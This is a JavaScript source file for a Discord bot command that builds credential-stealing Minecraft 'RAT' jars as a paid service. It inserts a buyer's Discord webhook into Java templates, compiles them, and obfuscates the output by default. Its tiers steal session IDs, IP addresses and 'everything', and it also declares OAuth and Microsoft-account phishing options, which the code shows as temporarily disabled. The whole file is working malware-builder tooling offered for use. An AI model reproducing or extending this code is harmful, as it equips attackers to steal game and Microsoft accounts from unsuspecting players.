import { SlashCommandBuilder, AttachmentBuilder } from "discord.js";
import { randomUUID } from "crypto";
import util from "node:util";
import { exec as exec1 } from "node:child_process";
import { readFile, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

import StatusBar from "../StatusBar.js";
import * as oAuthDB from "../../oAuth/database.js";
import * as SHDB from "../../SkyHelper/database.js";

const exec = util.promisify(exec1);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const { clientID, redirectURL } = JSON.parse(
  await readFile(new URL("../../oAuth/config.json", import.meta.url)),
);

export const cooldown = {
  tier_0: 60 * 15,
  tier_1: 60 * 5,
  tier_2: 60 * 2,
  tier_3: 60 * 1,
};
export const tier = {
  free: [0, 1, 2, 3],
  basic: [1, 2, 3],
  premium: [1, 2, 3],
  oauth: [0, 1, 2, 3],
  phisher: [0, 1, 2, 3],
};
export const data = new SlashCommandBuilder()
  .setName("build")
  .setDescription("Builds a jar with the specified webhook.")
  .addSubcommand((subcommand) =>
    subcommand
      .setName("free")
      .setDescription("Build a RAT for just Minecraft SessionID stealing.")
      .addStringOption((option) =>
        option
          .setName("webhook")
          .setDescription("The webhook to put in the jar")
          .setRequired(true),
      )
      .addBooleanOption((option) =>
        option
          .setName("obfuscation")
          .setDescription("Add obfuscation or not")
          .setRequired(false),
      ),
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("basic")
      .setDescription(
        "Build a RAT for Minecraft SessionID stealing with IP and Networth.",
      )
      .addStringOption((option) =>
        option
          .setName("webhook")
          .setDescription("The webhook to put in the jar")
          .setRequired(true),
      )
      .addBooleanOption((option) =>
        option
          .setName("obfuscation")
          .setDescription("Add obfuscation or not")
          .setRequired(false),
      ),
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("premium")
      .setDescription("Build a RAT for stealing everything.")
      .addStringOption((option) =>
        option
          .setName("webhook")
          .setDescription("The webhook to put in the jar")
          .setRequired(true),
      )
      .addBooleanOption((option) =>
        option
          .setName("obfuscation")
          .setDescription("Add obfuscation or not")
          .setRequired(false),
      ),
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("oauth")
      .setDescription("Build an oAuth link for Minecraft Session ID stealing.")
      .addStringOption((option) =>
        option
          .setName("webhook")
          .setDescription("The webhook to use for oAuth")
          .setRequired(true),
      ),
  )
  .addSubcommand((subcommand) =>
    subcommand
      .setName("phisher")
      .setDescription("Build a phisher bot for Microsoft Account stealing.")
      .addStringOption((option) =>
        option
          .setName("token")
          .setDescription("Your bot token")
          .setRequired(true),
      )
      .addStringOption((option) =>
        option.setName("id").setDescription("Your bot ID").setRequired(true),
      ),
  )
  .setDMPermission(false);

export async function execute(client, interaction) {
  if (interaction.channel.id != client.config.building) {
    return client.sendErrorEmbed(
      interaction,
      `You can only build/use RAT commands in <#${client.config.building}>!`,
    );
  }

  const ratType = interaction.options.getSubcommand();

  // Disable specific commands
  if (ratType === "oauth" || ratType === "phisher") {
    return interaction.reply({
      embeds: [
        {
          title: "Unavailable Command",
          description:
            "The selected command is temporarily disabled. Please try again later.",
          color: 0xff0000,
        },
      ],
      ephemeral: true,
    });
  }

  const ratTypeFormatted = ratType.charAt(0).toUpperCase() + ratType.slice(1);
  const webhook = interaction.options.getString("webhook");
  const webhookRegex =
    /^https:\/\/(?:\w+\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[A-Za-z0-9-_]+$/g;
  if (ratType != "phisher" && !webhookRegex.test(webhook)) {
    return client.sendErrorEmbed(interaction, "Please enter a valid webhook!");
  }

  const plan = await client.db.getPlan(interaction, interaction.user.id);
  const dhooked = plan == client.TIER_0;

  if (["free", "basic", "premium"].includes(ratType)) {
    const statusBar = new StatusBar(
      ratType,
      interaction,
      "Compiling",
      "Obfuscating",
    );
    const webhookExists = await client.db.getCode(interaction.user.id, webhook);
    const userWebhooks = await client.db.getWebhooks(interaction.user.id);

    if (
      userWebhooks.length >= client.config.limits.webhooks[plan] &&
      !webhookExists
    ) {
      return client.sendErrorEmbed(
        interaction,
        "You've exceeded the webhook limit. \nYou can view your webhooks using **/webhooks list** and delete them using **/webhooks delete**.",
      );
    }

    if (client.isBuilding) {
      await client.sendErrorEmbed(
        interaction,
        "Another JAR is already being built!",
      );
      return;
    }

    client.isBuilding = true;
    await statusBar.start();

    const code = webhookExists ?? randomUUID();
    await client.db.setWebhook(interaction.user.id, code, webhook, dhooked);

    const jar = await createJAR(
      client,
      statusBar,
      interaction,
      ratType,
      ratTypeFormatted,
      code,
    );
    if (!jar) {
      client.isBuilding = false;
      await client.sendErrorEmbed(
        interaction,
        "Something went wrong. Please contact an administrator.",
      );
      return;
    }

    await statusBar.finish(jar);
    client.isBuilding = false;
  }
}

async function createJAR(
  client,
  statusBar,
  interaction,
  ratType,
  ratTypeFormatted,
  uuid,
) {
  const webhook = interaction.options.getString("webhook");
  const obfuscation = client.config.devs.includes(interaction.user.id)
    ? interaction.options.getBoolean("obfuscation") == null ||
      interaction.options.getBoolean("obfuscation")
    : true;

  return new Promise(async function (resolve, reject) {
    try {
      let javaFile;

      if (ratType === "free") {
        javaFile = path.join(__dirname, "../tempFiles/FreeMod.java");
      } else if (ratType === "basic") {
        javaFile = path.join(__dirname, "../tempFiles/BasicMod.java");
      } else if (ratType === "premium") {
        javaFile = path.join(__dirname, "../tempFiles/PremiumMod.java");
      }

      const data = await readFile(javaFile, { encoding: "utf8" });
      const updatedData = data
        .replace(/USER_ID_HERE/g, uuid)
        .replace(/YOUR_DISCORD_WEBHOOK/g, webhook);

      await writeFile(
        "../RAT/src/main/java/com/example/examplemod/ExampleMod.java",
        updatedData,
        { encoding: "utf8" },
      );

      const buildOutput = await exec(
        "export JAVA_HOME=/usr/lib/jvm/java-8-openjdk && export PATH=$JAVA_HOME/bin:$PATH && cd ../RAT && ./gradlew build",
      );

      if (
        buildOutput.stderr.includes(
          "Note: Some input files use or override a deprecated API.",
        )
      ) {
        client.logError(buildOutput.stderr);
        resolve(null);
        return;
      }

      await delay(2000);

      if (!obfuscation) {
        const attachment = new AttachmentBuilder(
          "../RAT/build/libs/RAT-1.0.jar",
        ).setName(`${ratTypeFormatted}-RAT-1.0.jar`);
        resolve(attachment);
      } else {
        const obfuscationOutput = await exec(
          "export JAVA_HOME=/usr/lib/jvm/java-8-openjdk && export PATH=$JAVA_HOME/bin:$PATH && java -jar ../RAT/build/libs/jobf.jar --jarIn ../RAT/build/libs/RAT-1.0.jar --jarOut ../RAT/build/libs/RAT-1.0-obf.jar",
        );

        if (obfuscationOutput.stderr) {
          client.logError(obfuscationOutput.stderr);
          resolve(null);
          return;
        }

        const attachment = new AttachmentBuilder(
          "../RAT/build/libs/RAT-1.0-obf.jar",
        ).setName(`${ratTypeFormatted}-RAT-1.0-obf.jar`);
        resolve(attachment);
      }
    } catch (err) {
      client.logError(err.message);
      resolve(null);
    }
  });
}
